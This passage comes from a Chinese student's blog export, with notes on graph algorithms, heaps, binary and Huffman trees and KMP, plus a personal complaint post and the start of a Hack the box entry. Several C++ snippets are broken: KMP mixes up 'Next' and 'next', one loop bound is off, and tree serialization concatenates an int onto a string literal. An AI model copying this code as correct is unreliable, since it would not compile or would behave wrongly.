pq.push(e); \n    \n    int total_weight = 0;\n\n    while (!pq.empty()) {\n        Edge curr = pq.top(); pq.pop();\n        if (visited[curr.to]) continue;\n\n        visited[curr.to] = true;\n        total_weight += curr.weight;\n\n        for (auto &e : graph[curr.to]) {\n            if (!visited[e.to]) pq.push(e);\n        }\n    }\n    return total_weight;\n}\n\n```\n\n#### Kruskal 算法\n算法思想很简单：\n> 我先把全世界最便宜的边找出来，想加就加，只要它不会成环。\n\n那么**先把边按权值大小排序，从上往下加入边，如果不成环就加**。（这里判断是否成环需要用到并查集）。\n代码之后补充，因为还没了解并查集😿。\n\n---\n### 拓扑排序算法\n![image.png](https://img.moyuin.top/i/2025/04/10/67f7b8ca34b28.png)\n\n拓扑排序还是很容易去理解的，我们根据前后关联性可以轻松写出它的拓扑排序。\n拓扑排序算法一般还是用于查找该图“是否有拓扑排序”。\n\n---\n#### 关键路径\n从起点到某点的最长路径称为起点到该点的**关键路径**。一般用于AOE网络。\n![image.png](https://img.moyuin.top/i/2025/04/15/67fdc0f8c51bb.png)\n\n关键路径上的活动被称为**关键活动**。\n对于一个图的优先调度，有多余的人力物力放在非关键路径上其实是不起效果的。\n**求解关键路径**：\n![image.png](https://img.moyuin.top/i/2025/04/15/67fdc43fa4398.png)\n\n目标：**从 v₀ 出发走到 v₈，找出耗时最长但不能耽误任何环节的一条路径，也就是“关键路径”。**\n\nA. 先算每个事件的 `earliest[v]`\n 从起点 v₀ 开始，最早发生时间记为 0\n然后向下游传播，按下式推：\n> `earliest[v] = max{ earliest[u] + weight(u,v) }`\n\n按顺序来算：\n- **v₀** = 0（起点）\n- **v₁** = v₀ + 5 = **5**（a₀）\n- **v₂** = v₀ + 3 = **3**（a₁）\n- **v₃** = v₂ + 5 = **8**（a₂）\n    \n- **v₄** 有两条路：\n    - v₂ + 1 = 4（a₃）\n    - v₁ + 4 = 9（a₄）→ 取 max → **9**\n    \n- **v₅** = v₁ + 2 = **7**（a₅）\n    \n- v₆ 有两条路：\n    - v₃ + 7 = 15（a₆）\n    - v₄ + 5 = 14（a₇）→ max → **15**\n        \n- **v₇** 有两条路：\n    - v₄ + 5 = 14（a₈）\n    - v₅ + 6 = 13（a₉）→ max → **14**\n        \n- **v₈** 有两条路：\n    - v₆ + 2 = 17（a₁₀）\n    - v₇ + 8 = 22（a₁₁）→ max → **22**\n        \n于是你现在有了 `earliest[v]` ：见图中绿色数字。\n\nB. 反过来算 `latest[v]`（从终点往前推）\n从终点 v₈ 开始：\n- v₈ = 22（设为基准）\n我们用公式：\n> `latest[u] = min{ latest[v] - weight(u,v) }`\n\n倒着来算\n- v₇ = v₈ - 8 = **14**（a₁₁）\n- v₆ = v₈ - 2 = **20**（a₁₀）\n- v₅ = v₇ - 6 = **8**（a₉）\n\n- v₄：\n    - v₇ - 5 = 9（a₈）\n    - v₆ - 5 = 15（a₇）→ 取 **min = 9**\n    \n- v₃ = v₆ - 7 = **13**\n    \n- v₂：\n    - v₃ - 5 = 8（a₂）\n    - v₄ - 1 = 8（a₃）→ min = **8**\n    \n- v₁:\n    - v₄ - 4 = 5（a₄）\n    - v₅ - 2 = 6（a₅）→ min = **5**\n        \n- v₀:\n    - v₁ - 5 = 0（a₀）    \n    - v₂ - 3 = 5（a₁）→ min = **0**\n    \nC. 计算每条活动的 e[i] 和 l[i]\n对每条活动 aᵢ：\n`e[i] = earliest[u]` （活动起点的最早时间）\n`l[i] = latest[v] - weight(u,v)`（终点最晚时间-任务耗时）\n若 `e[i] == l[i]`，说明该活动不能晚，就是关键路径的一部分！\n\n我们来实际举几个：\n a₀（v₀→v₁）：\n- e[0] = earliest[v₀] = 0\n- l[0] = latest[v₁] - 5 = 5 - 5 = 0 ✔️ e = l → **关键路径**\n    \n a₄（v₁→v₄）：\n- e = 5（v₁）\n- l = 9 - 4 = 5 ✔️ 关键路径\n    \na₆（v₃→v₆）：\n- e = 8（v₃）\n- l = 20 - 7 = 13 ✘ 不是关键路径（8 ≠ 13）\n\n连接所有 e[i]=I[i] 的点，得到关键路径。\n最终关键路径是：\n> **v₀ → v₁ → v₄ → v₇ → v₈**\n\n总耗时：5 + 4 + 5 + 8 = **22**（也就是项目最早完成时间）","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"数据结构-堆","url":"/2025/04/01/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-dui/","content":"# 数据结构-堆\n\n# 堆(实现优先级队列)\n\n优先级队列是一种特殊的队列，特殊在优先级队列的**出队顺序**按照事先规定的**优先级顺序**进行。\n可以用**线性表**实现，但每次需要遍历，这样的出队操作复杂度为 O(n)，效率低，因此考虑使用**堆**来实现优先级队列。\n堆通常看作是**一棵完全二叉树**，且某个节点的值总是不大于或不小于其父节点的值。\n\n## 基本理解\n参考的是CSDN的一条[教程](https://blog.csdn.net/xiaomucgwlmx/article/details/103522410)，很好理解。\n### 堆的插入\n每次都是新数据放在数组最后，然后将数据交换以满足堆的性质（最大堆，最小堆）。\n![](/images/数据结构-堆/20250401161835075.png)\n插入数据 16\n![](/images/数据结构-堆/20250401162218264.png)\n为满足最大堆，调整位置，有父节点与孩节点交换。\n![](/images/数据结构-堆/20250401161953977.png)\n依然没有完全符合最大堆（根节点数据最大），继续调整位置。\n![](/images/数据结构-堆/20250401162400848.png)\n\n### 堆的节点删除\n![](/images/数据结构-堆/20250401162859978.png)\n堆中**每次删除都只能删除堆顶元素**。实际操作是给最后一个数据的值（最大或最小值，视堆的性质而定）赋值到堆顶，然后调整位置。\n![](/images/数据结构-堆/20250401163525900.png)\n然后开始不断调整...\n![](/images/数据结构-堆/20250401163552994.png)\n![](/images/数据结构-堆/20250401163558282.png)\n\n### 构造最大堆\n我们从一个例题开始。目前我们有原始数组\n`a[]={4,1,3,2,16,9,10,14,8,7}`\n采用顺序存储的方式，对应的完全二叉树如下图：\n![](/images/数据结构-堆/20250401163639280.png)\n假设数组中有 n 个元素，我们的遍历与调整应该从`a[i],此时 i=n/2-1` 开始，然后往前推。（即最中间的那个元素），将它看作父节点，去和它的孩子比较（**不要和它的父节点比较**）。一样的逻辑，不断比较父节点和孩子节点调整，最后做到最大的数在最上面。\n\n![](/images/数据结构-堆/20250401164025600.png)\n\n推完了如果发现不是最大堆形式，我们就从最初点（ `a[0]` ）继续交换，对交换后的值继续交换...\n\n**最小堆构造与最大堆构造几乎一致，只是比较调整的时候逻辑是最小的换到父节点。**\n\n- 最大堆的插入节点就是在堆的最后，最小值后面添加一个节点，然后沿着数堆上升调整，和堆的插入是一致的。\n- 堆顶节点删除思想：将堆树的最后节点放到根节点，删除最大值，再重新初始化调整比较。\n逻辑是一样的。\n## 概念\n### 二叉堆\n二叉堆是一个用**完全二叉树**来实现的**优先队列**结构，支持高效插入与取最值操作。\n#### 特点\n- **完全二叉树**（除了最后一层，其他层都满，且从左到右填满）\n- 每个结点都满足：\n    - **最小堆（小根堆）**：父节点 ≤ 子节点\n    - **最大堆（大根堆）**：父节点 ≥ 子节点\n- 用**数组**实现（因为完全二叉树可以用下标映射）\n#### 小技巧\n- 父节点下标 i → 左子节点 2i，右子节点 2i+1\n- 子节点 j → 父节点是 j/2（向下取整）\n- 上调插入 push O(log n)，下调删除最值 pop O(log n)，取最值 O(1)\n二叉堆是一种隐式数据结构，将元素的逻辑结构蕴含在存储结构中，避免额外的指针空间开销，所以经常用。\n\n### 多叉堆\n多叉堆（d-ary heap）就是一个**每个节点有 d 个孩子的堆**，也是一种用数组实现的优先队列。\n#### 特点\n- 一般是**d 叉完全树**\n- 小根堆 / 大根堆原则依然成立\n- 结构仍然是数组实现，不过下标关系会变化：\n\n📌 设根节点下标为 0（或 1 视实现而定）：\n- 父节点  i → 子节点范围是：`d*i + 1` 到 `d*i + d`\n- 子节点  j→ 父节点是：`(j - 1) / d`\n\n### 应用\n- 哈夫曼树的构建。\n![](/images/树/20250325101821385.png)\n- Dijkstra 最短路径的构建\n- 贪心算法\n## 实现\n### STL 实现\n在 STL 里有一个现成的“优先队列”。\n```cpp\nstd::priority_queue\n```\n本身是一个堆结构封装好的数据结构，默认用的是大根堆，最大值优先。\n```cpp\n#include <queue>\n#include <vector>\n#include <iostream>\nusing namespace std;\n\nint main() {\n    priority_queue<int> pq;\n\n    pq.push(5);\n    pq.push(2);\n    pq.push(8);\n\n    cout << pq.top() << endl; // 输出 8（最大值）\n\n    pq.pop(); // 删除最大值\n\n    cout << pq.top() << endl; // 输出 5\n\n    return 0;\n}\n\n```\n如果想要最小值优先，可以构造优先级队列的时候，传入比较函数。\n```cpp\npriority_queue<int, vector<int>, greater<int>> pq;\n\npq.push(5);\npq.push(2);\npq.push(8);\n\ncout << pq.top() << endl; // 输出 2（最小值）\n\n```\n如果想要自定义结构体的优先级，得先写一个比较器（或者lambda表达式等）\n```cpp\nstruct Node {\n    int id, val;\n};\nstruct cmp {\n    bool operator()(const Node &a, const Node &b) {\n        return a.val > b.val; // 小根堆：val小的优先\n    }\n};\npriority_queue<Node, vector<Node>, cmp> pq;\n\n```\n这里也附上一个lambda表达式的模板，由于 lambda 是匿名类型，而priority_queue 是模板类，所以传参略微复杂。\n```cpp\nauto cmp = ![](const pair<int, int> &a, const pair<int, int> &b) {\n    return a.second > b.second;  // 小根堆：值小的优先\n};\n\npriority_queue<\n    pair<int, int>,\n    vector<pair<int, int>>,\n    decltype(cmp)\n> pq(cmp);\n\n```\n为什么要写 `decltype(cmp)`？\n- 因为 lambda 是匿名类型，必须用 `decltype` 获取它的类型作为模板参数。\n- 然后把这个比较器传进去初始化构造函数 `pq(cmp)`\n **完整用法**\n```cpp\n#include <iostream>\n#include <queue>\n#include <vector>\nusing namespace std;\n\nint main() {\n    // 按 second 小的优先（小根堆）\n    auto cmp = ![](const pair<int, int>& a, const pair<int, int>& b) {\n        return a.second > b.second;\n    };\n\n    priority_queue<\n        pair<int, int>,\n        vector<pair<int, int>>,\n        decltype(cmp)\n    > pq(cmp);  // 注意要传 cmp 进去！\n\n    pq.push({1, 10});\n    pq.push({2, 5});\n    pq.push({3, 20});\n\n    while (!pq.empty()) {\n        cout << pq.top().first << \" \" << pq.top().second << endl;\n        pq.pop();\n    }\n\n    return 0;\n}\n```\n","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"数据结构-树","url":"/2025/03/25/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-shu/","content":"# 树\n\n## 完全二叉树\n### 基本性质\n完全二叉树有n个结点。\n完全二叉树的深度 **d=log2(n+1)**\n\n#### 存储结构\n主要存储方式:顺序存储+链式存储\n##### 顺序存储\n各个结点的索引与顺序表位置一一对应，让结点的数据存放在顺序表相应位置的单元中。\n顺序存储当数组，不过要开数组，可能实现空间浪费。\n![](/images/树/f42c3e4be40e4e3230917399d16f7ff.jpg)\n##### 链式存储\n![](/images/树/b85220c0dc44ca17d84adda22934d8c.jpg)\n\n有二叉链表和三叉链表，本质上就是有left，right，甚至还有一个parent的数据结点，指向上一个这个结点的父结点。\n![](/images/树/ba9b63dc6eb98c6ffcb7f51f0b7916e.jpg)\n\n```cpp\nvoid createBinarytree(int value,node* left_tree,node* right_tree){\n\tnode *tree=new BinaryTreeNode();\n\ttree.data()=value;\n\ttree.left_tree()=left_tree;\n\ttree.right_tree()=right_tree;//创建新的二叉树\n}\n```\n#### 遍历概念\n分为**前序遍历，中序遍历，后序遍历**\n方法不同，本质是递归方式中访问根节点的时机不同。\n先遍历左子树，再遍历右子树，访问根节点root是插入其中的。遍历时间是O(n)。\n![](/images/树/5c0005353c81ef9c30cc9715aed02d1.jpg)\n主要是中序遍历不太好理解。把A的左侧先遍历了，然后回到A，继续回到右侧遍历，但是FKC这里不好理解。\n>先遍历B的左子树D，对于D也是中序遍历的规则，先把D的左子树遍历了，对于D的左子树只有一个结点H，所以我们一开始就是H，然后遍历D的右子树I，然后回到D，来到B，接着遍历B的右子树E，由于E没有左子树，所以直接从空回到E，然后读取右结点，读取J，读完后B的整个左子树读取完成，接着我们回到A，然后读取C这颗右子树，由于C这棵树有左结点，所以我们读取F这颗左树，这棵F树的左结点为空，所以从空返回F，接着读取F的右树k，之后F这颗左树完全完成，回到C，C的右子树为空，所以此时此刻遍历结束。\n\n话太多。\n**中序遍历**就是：先读左边的小三角形 → 然后到顶点 → 最后读右边的小三角形。\n\n\n\n注意，所有的结点遍历此时此刻都要遵循其递归算法的规则，**所有节点**，必须都是左数-右数，读取根结点的步骤插入其中，形成一种递归调用。**从底部三角形模式读取**。\n![](/images/树/8b03e03cd81aad2ff9cad991ccb8a26.jpg)\n\n通过计算二叉树的高度，可用后序遍历左子树+右子树，得到两个高度的最高作为树的高度。\n\n#### 表达式树\n前缀和后缀和中缀读取。\n![](/images/树/2f6c1ef937715be115536a6046ece48.jpg)\n本质上是栈+递归的读取。\n\n#### 遍历的非递归算法\n也有非递归的转化算法，本质还是利用递归的本质，栈。\n```cpp\n//前序遍历\nvoid preorder(TreeNode* root) {\n    if (!root) return;\n    stack<TreeNode*> s;\n    s.push(root);\n    while (!s.empty()) {\n        TreeNode* node = s.top();\n        s.pop();\n        cout << node->val << \" \";  // 访问当前节点\n        if (node->right) s.push(node->right); // 先压右\n        if (node->left) s.push(node->left);   // 再压左，保证左子树先出来\n    }\n}\n\n//中序遍历\nvoid inorder(TreeNode* root) {\n    stack<TreeNode*> s;\n    TreeNode* curr = root;\n    while (curr || !s.empty()) {\n        while (curr) { // 先把左子树压栈\n            s.push(curr);\n            curr = curr->left;\n        }\n        curr = s.top();\n        s.pop();\n        cout << curr->val << \" \"; // 访问当前节点\n        curr = curr->right; // 转向右子树\n    }\n}\n\n//后序遍历\nvoid postorder(TreeNode* root) {\n    if (!root) return;\n    stack<TreeNode*> s1, s2;\n    s1.push(root);\n    while (!s1.empty()) {\n        TreeNode* node = s1.top();\n        s1.pop();\n        s2.push(node); // 先压入第二个栈\n        if (node->left) s1.push(node->left);  // 先压左\n        if (node->right) s1.push(node->right); // 后压右\n    }\n    while (!s2.empty()) {\n        cout << s2.top()->val << \" \"; // 访问顺序就是 左 → 右 → 根\n        s2.pop();\n    }\n}//利用\n\n```\n\n也可以考虑队列来写。\n```cpp\nvoid levelOrder(TreeNode* root) {\n    if (!root) return;\n    queue<TreeNode*> q;\n    q.push(root);\n    while (!q.empty()) {\n        TreeNode* node = q.front();\n        q.pop();\n        cout << node->val << \" \"; // 访问当前节点\n        if (node->left) q.push(node->left);  // 先入左子节点\n        if (node->right) q.push(node->right); // 再入右子节点\n    }\n}\n//队列queue用于层序遍历\n```\n\n#### 二叉树的序列化与反序列化\n序列化：遍历，得到结点的线性序列，转化成线性结构用于线性表的存储。\n反序列化：根据线性序列重构原始的二叉树。\n往往\n前者基于遍历算法，后者依然得用栈来还原。\n>经典问题：用前序遍历和中序遍历结果重构二叉树，分析重构条件和算法的时间复杂度。\n>知道两个遍历，得到真正的二叉树结果。\n\n##### 前序遍历序列化&反序列化\n都利用了递归来还原，将字符串与数据的互相转化。\n基于前序遍历。\n```cpp\n//序列化\nvoid serialize(TreeNode* root, string& s) {\n    if (!root) {\n        s += \"#,\";\n        return;\n    }\n    s += root->val + \",\"; // 访问根\n    serialize(root->left, s);  // 递归左子树\n    serialize(root->right, s); // 递归右子树\n}\n//反序列化\nTreeNode* deserialize(istringstream& ss) {\n    string val;\n    getline(ss, val, ',');\n    if (val == \"#\") return nullptr; // 空节点\n\n    TreeNode* node = new TreeNode(val); \n    node->left = deserialize(ss);\n    node->right = deserialize(ss);\n    return node;\n}\n```\n\n##### 层序遍历序列化&反序列化\n利用队列queue。\n```cpp\nstring serialize(TreeNode* root) {\n    if (!root) return \"#\";\n    queue<TreeNode*> q;\n    q.push(root);\n    string res = \"\";\n    \n    while (!q.empty()) {\n        TreeNode* node = q.front();\n        q.pop();\n        if (node) {\n            res += node->val + \",\";\n            q.push(node->left);\n            q.push(node->right);\n        } else {\n            res += \"#,\";\n        }\n    }\n    return res;\n}\n\n//反序列化\nTreeNode* deserialize(string data) {\n    if (data == \"#\") return nullptr;\n    istringstream ss(data);\n    string val;\n    getline(ss, val, ',');\n    \n    TreeNode* root = new TreeNode(val);\n    queue<TreeNode*> q;\n    q.push(root);\n    \n    while (!q.empty()) {\n        TreeNode* node = q.front();\n        q.pop();\n        \n        if (getline(ss, val, ',')) {\n            if (val != \"#\") {\n                node->left = new TreeNode(val);\n                q.push(node->left);\n            }\n        }\n        if (getline(ss, val, ',')) {\n            if (val != \"#\") {\n                node->right = new TreeNode(val);\n                q.push(node->right);\n            }\n        }\n    }\n    return root;\n}\n```\n\n## 最优二叉树（哈夫曼树）\n### 带权二叉树\n每个结点带有一个权重值。\n![](/images/树/79dfdcf215f8727742cec5f2837eadd.jpg)\n#### 带权路径长度\n**WPL=w1l1+w2l2+....+wnln**\n带权路径长度最小的二叉树，成为最优二叉树，即哈夫曼树。\n![](/images/树/a52bfc7abd4ed7949cebcafed828d45.jpg)\n\n### 基本性质\n定理1：**最优二叉树一定是满二叉树。**\n定理2： 最优二叉树中，如果两个叶结点的权重值不同，**则权重值小的叶结点中的树的层数，大于等于权重值大的叶节点**。 \n### 哈夫曼算法\n一个至下而上的构建最优二叉树的方法，通过不断合并两个带权二叉树，最终生成最优二叉树。\n![](/images/树/b048c8f0ebcb2a15146ee9a05a5ed74.jpg)\n### 构建哈夫曼树\n时间复杂度：O(n^2)\n```cpp\n//创建哈夫曼树代码\nstruct Node {\n    char ch;        // 字符\n    int freq;       // 频率（权值）\n    Node *left, *right;\n\n    // 构造函数\n    Node(char c, int f) : ch(c), freq(f), left(nullptr), right(nullptr) {}\n};\n\n// 自定义比较函数（优先队列默认大根堆，我们需要小根堆）\nstruct Compare {\n    bool operator()(Node* a, Node* b) {\n        return a->freq > b->freq;  // 频率小的优先\n    }\n};\n\n// 构造哈夫曼树\nNode* buildHuffmanTree(vector<pair<char, int>> freqList) {\n    priority_queue<Node*, vector<Node*>, Compare> pq;\n\n    // 初始化优先队列（最小堆）\n    for (auto& it : freqList) {\n        pq.push(new Node(it.first, it.second));\n    }\n\n    // 构建哈夫曼树\n    while (pq.size() > 1) {\n        Node* left = pq.top(); pq.pop();\n        Node* right = pq.top(); pq.pop();\n\n        // 创建新节点（合并两个最小节点）\n        Node* parent = new Node('\\0', left->freq + right->freq);\n        parent->left = left;\n        parent->right = right;\n\n        // 插入新节点到优先队列\n        pq.push(parent);\n    }\n\n    // 最终根节点就是哈夫曼树的根\n    return pq.top();\n}\n\n```\n### 哈夫曼树应用\n#### 哈夫曼编码\n将文本字符串转化为二进制字符串编码。\n在一般方案里，我们使用定长码，规定ascll码中的每个字符的编号。但我们这样的话空间花销大。所以我们可以使用不定长码来提高效率。\n##### 不定长码\n使用频率高的字符采用短编码，频率低的字符采用长编码。\n###### 前缀码\n一种常用的不定长码，每个字母的编码都不是其他字母编码的前缀。\n（这样的编码可以避免读取的歧义，比如1101，可以看作1 101，也可以看作11 01，这样的歧义需要避免。）\n**构造示例**：\n![](/images/树/a0149c452deca71987867fcefd399cd.jpg)\n其实还是很有意思的。我们可以算编码长度的加权平均数，即平均码长。\nP为出现频率，W为码长。\n$$\n\\bar{W}= \\frac{1}{n}\\sum_{i=1}^{n} (P(i)*W(i))\n$$\n\n## 树表示法\n### 父指针表示法\n保存父节点的索引。\n![](/images/树/fd75aeae4ccae8845829ade83c135d7.jpg)\n一般用于实现并查集，时间复杂度为O(H)，H为树的高度。\n\n### 孩子表示法\n存储的是结点所有的孩子，是一个子节点链表，存储的是头指针。\n各个子节点按从左向右的顺序排列。\n![](/images/树/6001222e3a5c9ba14b6cdd93fe1530e.jpg)\n### 孩子兄弟表示法\n常常使用**二叉链表**实现。每个节点存放它的第一个孩子和它的下一个兄弟的信息。\n其实这个是最直观表现树结构的，兄弟信息代表所在层，孩子信息指向下一层。\n![](/images/树/4fb17c82d96e8f451b97cf62689314e.jpg)\n## 树与二叉树与森林的转换\n![](/images/树/Pasted%20image%2020250320090033.png)\n![](/images/树/Pasted%20image%2020250320090130.png)\n## 树和森林的遍历\n树和森林的遍历都只有前序遍历和后序遍历，**无中序遍历**。\n规则相同，都是从左到右，依次遍历。\n**树和森林**的前序遍历与二叉树的前序遍历相同，**后序遍历与二叉树的中序遍历相同**，遍历时间复杂度与二叉树一样，都是O(n)。\n![](/images/树/Pasted%20image%2020250320090331.png)\n![](/images/树/Pasted%20image%2020250320090848.png)\n\n---\n","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"KMP算法","url":"/2025/03/19/xue-xi/shu-ju-jie-gou/kmp-suan-fa/","content":"# KMP算法\n\n我觉得还做不出题，想不通源码，先放着，wiki在这里：[KMP算法](https://oi-wiki.org/string/kmp/)\n\n## 基本概念-next数组\n\n前缀：**不含最后一个字符但包含第一个字符**的 所有字串\n后缀：**不含第一个字符但包含最后一个字符**，的 所有字串\n前缀表 next ：代表 p[0:i] 即 p 的前 i+1 的字符，最长相等前后缀的长度,即**前后缀的最长相同字串的长度**。\n如：\n![](/images/KMP算法/Pasted%20image%2020250318153118.png)\n假设模式串 `P = \"ABABCABAA\"`，我们来计算 `next` 数组。\n\n| 位置 `i` | P[i] | `P[0:i]` (子串) | `next[i]` | 解释                        |\n| ------ | ---- | ------------- | --------- | ------------------------- |\n| 0      | A    | A             | 0         | 只有一个字符，无前后缀               |\n| 1      | B    | AB            | 0         | \"A\"（前缀） ≠ \"B\"（后缀）         |\n| 2      | A    | ABA           | 1         | \"A\"（前缀）= \"A\"（后缀），长度 1     |\n| 3      | B    | ABAB          | 2         | \"AB\"（前缀）= \"AB\"（后缀），长度 2   |\n| 4      | C    | ABABC         | 0         | \"ABAB\" ≠ \"BABC\"，无相等前后缀    |\n| 5      | A    | ABABCA        | 1         | \"A\"（前缀）= \"A\"（后缀），长度 1     |\n| 6      | B    | ABABCAB       | 2         | \"AB\"（前缀）= \"AB\"（后缀），长度 2   |\n| 7      | A    | ABABCABA      | 3         | \"ABA\"（前缀）= \"ABA\"（后缀），长度 3 |\n| 8      | A    | ABABCABAA     | 1         | \"A\"（前缀）= \"A\"（后缀），长度 1     |\n\n---\n\n如何构建呢？可以用一个循环，一个先计算前缀最长的长度，如果失配就重新移动字符匹配，保留最大值。\n实现：\n这里参考[KMP算法next数组的优化过程](https://oi-wiki.org/string/kmp/#%E8%BF%87%E7%A8%8B_1)\n\n```cpp\nvector<int>Next(const string &p){\n\tint m=p.size();\n\tvector<int>next(m,0);\n\tint j=0;\n\n\t for(int i=1;i<m-1;i++){\n\t\t while(j>0 && p[i]!=p[j]){\n\t\t\t j=next[j-1];//失配，变成前一个匹配的位置。\n\t\t }\n\t\t if(p[i]==p[j]) j++;//配对，记录最长长度增加\n\t\t next[i]=j;\n\t }\n\t return next;\n\t}\n```\n## KMP算法比较\n\n>给定一个文本 t 和一个字符串 s，我们尝试找到并展示 s 在 t 中的所有出现（occurrence）。 \n>为了简便起见，我们用 n 表示字符串 s 的长度，用 m 表示文本 t 的长度。 我们构造一个字符串 s + # + t，其中 # 为一个既不出现在 s 中也不出现在 t 中的分隔符。接下 来计算该字符串的前缀函数。\n>现在考虑该前缀函数除去最开始 n + 1 个值（即属于字符串 s 和分 隔符的函数值）后其余函数值的意义。根据定义，next[i] 为右端点在 i 且同时为一个前缀的最长真 子串的长度，具体到我们的这种情况下，其值为与 s 的前缀相同且右端点位于 i 的最长子串的长 度。由于分隔符的存在，该长度不可能超过 n。而如果等式 next[i] = n 成立，则意味着 s 完整出现 在该位置（即其右端点位于位置 i）。注意该位置的下标是对字符串 s + # + t 而言的。 因此如果在某一位置 i 有 π[i] = n 成立，则字符串 s 在字符串 t 的 i − (n − 1) − (n + 1) = i − 2n 处出现。\n\n这是oier算法，其实我想不出来：\n```cpp\nvector<int>search(string t,string s){\n\tstring cur = s+'#'+t;\n\tint sz1=t.size(),sz2=s.size();\n\tvector<int> v;\n\tvector<int>next=Next(cur)\n\tfor(int i=sz2+1;i<=sz2+sz1;i++){\n\t\tif(next[i]==sz2) v.push_back(i-2*sz2);\n\t}\n\treturn v;\n}\n```\nKMP 算法的想法是：设法利用这个已知信息，不要把「搜索位置」移回已经比较过的位置，继续把它向后移，这样就提高了效率。\n整个 KMP 算法中核心且难理解的是：\n1. 部分匹配表代码实现，理解不了。原理理解了，但是代码想不明白\n2. 当不匹配的时候，不源字符串不回溯，只根据部分匹配表，移动子串的下标，让子串回溯。\n\n所以用简单的模拟的话，是这样的：\n```cpp\nvector<int>KMP(string s,string p){\n    int sz1=s.size(),sz2=p.size();\n    vector<int>Next=getnext(p);\n    vector<int>v;\n    for(int i=0,j=0;i<sz1;i++){\n        if(s[i]==p[j]){\n            j++;\n        }\n         else if(j>0){\n            j=Next[j-1];\n            i--;//这里回溯j，是KMP算法的核心思路。\n        }\n        if(j==sz2){\n            v.push_back(i-j+1);\n            j=Next[j-1];\n        }\n    }\n    return v;    \n}\n```\n用 for 来一个一个匹配都懂，这里 KMP 算法核心就算那个回溯 j 和 push_back(i-j+1) 。\n至于为什么需要回溯`j`，这是KMP算法的核心思想，让我解释一下：\n### 为什么要回溯j的原因\n当我们在匹配过程中遇到不匹配的字符时，传统的字符串匹配算法会将模式串完全重置到开始位置，然后主串向前移动一位重新开始匹配。这样会导致很多已经比较过的字符被重新比较，效率很低。\n\nKMP算法的核心优化在于：\n **利用已知信息**：当匹配失败时，我们已经知道了模式串的前j个字符与主串的相应部分是匹配的。\n **避免重复工作**：我们不需要完全回到模式串的起始位置，而是可以跳到一个中间位置，这个位置由Next数组决定。\n **Next数组的含义**：`Next[j-1]`表示当模式串的第j个字符不匹配时，应该将模式串指针j回退到哪个位置，使得模式串的开头部分与主串的当前部分潜在地匹配。\n\n简单来说，回溯`j`使我们可以：\n- 充分利用已经获得的部分匹配信息\n- 避免从头开始重新匹配模式串\n- 实现线性时间复杂度的字符串查找\n\n这种\"聪明地跳过\"是KMP算法比朴素字符串匹配算法更高效的关键原因。\n\n### 为什么要返回 i-j+1 的位置\n关于为什么返回的是 `i-j+1` 而不是 `i` 的位置，这是因为在KMP算法中，当我们找到一个完全匹配时：\n1. `i` 指向的是**主串中**刚刚匹配完成的**最后一个字符的位置**（当前循环结束后）。\n2. `j` 等于模式串的长度 `sz2`，表示模式串已经完全匹配，所以这里把`j` 写作sz2没有任何问题。\n3. 我们需要返回的是**匹配开始的位置**，而不是结束的位置。\n\n计算匹配开始位置的公式是：\n```\n匹配起始位置 = 当前位置(i) - 模式串长度(j) + 1\n```\n\n具体分析：\n- 假设主串是 \"ABCDEF\"，模式串是 \"CDE\"\n- 当匹配完成时，`i` 指向 'E'（索引4），`j` 等于3\n- 匹配的起始位置应该是 'C'（索引2）\n- 索引计算：4 - 3 + 1 = 2 \n\n在这里的for循环实现中，因为循环结束后 `i` 会自增，所以 `i` 实际上指向的是匹配完成后的下一个字符位置，为了避免这种错误运算，我们在每次错误匹配回溯的时候，都做一次 **i--**，让 `i` 回到匹配完成的最后一个位置。因此，正确的计算是 `i-j+1`。\n## 总体实现代码：\n```cpp\nvector<int>getnext(string s){\n    int n=s.size();\n    int j=0;//前缀\n    vector<int>next(n,0);\n    for(int i=1;i<n;i++){//后缀\n        while(j>0&&s[i]!=s[j]) j=next[j-1];\n        if(s[j]==s[i]) j++;\n        next[i]=j;\n    }\n    return next;\n}\nvector<int>KMP(string s,string p){\n    int sz1=s.size(),sz2=p.size();\n    vector<int>next=getnext(p);\n    vector<int>v;\n    for(int i=0,j=0;i<sz1;i++){\n        if(s[i]==p[j]){\n            j++;\n        }\n         else if(j>0){\n            j=Next[j-1];\n            i--;\n        }\n        if(j==sz2){\n            v.push_back(i-j+1);\n            j=Next[j-1];\n        }\n    }\n    return v;    \n}\n\n  \n\nint main(){\n    string s,p;\n    cin>>s>>p;\n    vector<int>ans=KMP(s,p);\n    for(int i=0;i<ans.size();i++){\n        cout<<ans[i]+1<<endl;\n    }\n    vector<int>Next=next(p);\n    for(int i=0;i<Next.size();i++){\n        cout<<Next[i]<<\" \";\n    }\n    return 0;\n}\n\n```\n\n题目：[洛谷KMP模板题](https://www.luogu.com.cn/problem/P3375)\n\n","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"高数","url":"/2025/03/16/xue-xi/shu-xue/gao-shu-duo-yuan-wei-fen/","content":"# 高数\n## 连续，可偏导，可微证明\n感谢萱宝。\n![](/images/高数-多元微分/IMG_20250314_112120.jpg)\n\n\n\n\n\n\n\n\n","tags":["学习","数学"],"categories":["日常学习","高等数学"]},{"title":"抱怨","url":"/2025/03/13/sheng-huo/ji-lu/bao-yuan/","content":"# 抱怨\n## 不易😭\n为什么 Obsidian 没有**自动存放附件到指定位置+自动把粘贴图片改成 markdown 语法+支持插入格式修改**的三合一插件？？？\n第一个有 Custom Attachment Location\n第二个 Obsidian 自带\n第三个谁来救救我？？🥹\n每次 paste 图片的时候，**难道我一定要去手动修改我的粘贴格式，好让我的 hexo 识别到吗？**\n我超级懒的....不想折腾太多了😫\n\n\n---\n## 吹风机\n吹头发的时候吹风机喷火了，成了打火机。😭\n我前几周把以前的吹风机扔了，换了这个功率大的…😐🤨😩\n一举两得，浪费时间又浪费钱，谢谢教训。\n*其实糊味还挺香的。呃…再也不做不吃晚饭的事情了*\n\n****\n\n# Typecho\n被过时教程折磨到没脾气…\nai只适合用于原基础修改，不适合提供教程。👿\n在不同博客网站穿梭终于搭建起自己的[Typecho博客网站](blog.moyuin.top)，开心，但是折腾好累，难过😡。\n\n","tags":["记录"],"categories":["杂谈"]},{"title":"Hack the box","url":"/2025/03/11/xue-xi/ctf/hack-the-box/","content":"# Hack the box\n玩一下。\n## 起步\n起步的确很简单，连接了vpn然后就可以用kali玩玩渗透测试了。\n```bash\nsudo openvpn 